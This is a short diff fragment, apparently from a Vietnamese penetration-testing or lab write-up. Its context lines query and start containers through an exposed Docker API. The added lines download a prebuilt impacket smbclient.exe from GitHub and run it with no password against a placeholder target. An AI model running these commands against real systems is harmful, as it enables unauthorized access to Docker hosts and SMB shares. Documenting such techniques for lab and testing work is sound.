@@ -205,7 +205,12 @@ curl -X POST http://192.168.65.7:2375/containers/$cid_find/start
 # 2. Đọc log để xem kết quả trả về
 curl "http://192.168.65.7:2375/containers/$cid_find/logs?stdout=true&stderr=true" 2>/dev/null | strings
 ```
-
+```
+wget "https://github.com/ropnop/impacket_binaries/raw/master/smbclient.exe" -OutFile "smbclient.exe"
+```
+```
+.\smbclient.exe -no-pass //<IP_Mục_Tiêu>
+```
 
 
 
